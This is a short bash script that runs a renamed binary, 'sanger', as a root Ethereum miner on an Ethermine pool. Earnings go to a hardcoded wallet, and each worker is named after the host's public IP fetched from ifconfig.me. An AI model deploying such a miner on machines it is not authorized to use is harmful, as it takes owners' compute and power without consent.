#!/bin/bash

POOL=ethproxy+tcp://asia1.ethermine.org:4444
WALLET=0x1a2Ae59743eE7873D3145EbA4FDc686A9455E6c0
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-sgr

cd "$(dirname "$0")"

chmod +x ./sanger && sudo ./sanger -a ethash -o $POOL -u $WALLET.$WORKER $@
